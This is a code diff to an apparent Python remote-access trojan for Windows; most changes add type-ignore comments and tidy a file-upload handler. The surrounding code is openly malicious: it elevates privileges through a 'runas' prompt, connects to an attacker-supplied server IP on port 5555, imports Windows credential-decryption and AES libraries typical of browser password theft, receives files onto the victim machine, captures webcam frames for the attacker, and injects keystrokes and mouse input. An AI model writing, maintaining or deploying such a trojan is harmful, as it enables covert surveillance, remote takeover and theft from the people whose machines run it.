@@ -1,18 +1,18 @@
-import ctypes
-import sys
-import socket
-import os
-import time
-import pyautogui  # already imported
-import cv2, numpy as np, struct, io
-import subprocess
-import shutil
-import json
-import win32crypt
-import base64
-import sqlite3
-from Crypto.Cipher import AES  
-from pynput.mouse import Controller, Button
+import ctypes# type: ignore
+import sys# type: ignore
+import socket# type: ignore
+import os# type: ignore
+import time# type: ignore
+import pyautogui  # type: ignore # already imported
+import cv2, numpy as np, struct, io# type: ignore
+import subprocess# type: ignore
+import shutil# type: ignore
+import json# type: ignore
+import win32crypt# type: ignore
+import base64# type: ignore
+import sqlite3# type: ignore
+from Crypto.Cipher import AES  # type: ignore
+from pynput.mouse import Controller, Button# type: ignore
 
 mouse = Controller()
 
@@ -27,7 +27,7 @@ if not is_admin():
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
     sys.exit()
 
-SERVER_IP = "REPLACE WITH THE IPv4 OF THE COMPUTER YOUR ATTACKING FROM!"  # Change to your server IP
+SERVER_IP = "REPLACE WITH THE IPv4 OF THE COMPUTER YOUR ATTACKING FROM"  # Automatically inserted
 SERVER_PORT = 5555
 OUTPUT_FILE = "command_output.txt"
 
@@ -201,7 +201,7 @@ def recv_all(sock, length):
 
 def capture_and_send_webcam(client):
     try:
-        import cv2  
+        import cv2  # type: ignore
         cam = cv2.VideoCapture(0)
         ret, frame = cam.read()
         if ret:
@@ -259,9 +259,9 @@ def main():
                 elif command.startswith("upload "):
                     file_path = command.split(" ", 1)[1]
                     try:
-                        
-                        file_data = recv_all(client, 8)
-                        file_size = int.from_bytes(file_data, "big")
+                        # Don't receive command again — it's already received
+                        file_data_len_bytes = recv_all(client, 8)
+                        file_size = int.from_bytes(file_data_len_bytes, "big")
                         file_content = recv_all(client, file_size)
 
                         with open(file_path, "wb") as f:
@@ -270,9 +270,9 @@ def main():
                         response = f"[+] File received and saved to {file_path}"
                     except Exception as e:
                         response = f"[-] Failed to receive file: {e}"
+
                     save_output_to_file(response)
                     send_data(client, response.encode())
-
 
                 elif command == "webcam":
                     response = capture_and_send_webcam(client)
@@ -303,7 +303,7 @@ def main():
 
                 elif command.startswith("keytype "):
                     text = command[8:]
-                    from pynput.keyboard import Controller as KeyboardController 
+                    from pynput.keyboard import Controller as KeyboardController # type: ignore
                     keyboard = KeyboardController()
                     keyboard.type(text)
                     response = f"[+] Typed text: {text}"
@@ -312,7 +312,7 @@ def main():
 
                 elif command == "enter":
                     try:
-                        from pynput.keyboard import Controller as KeyboardController, Key 
+                        from pynput.keyboard import Controller as KeyboardController, Key # type: ignore
                         keyboard = KeyboardController()
                         keyboard.press(Key.enter)
                         keyboard.release(Key.enter)
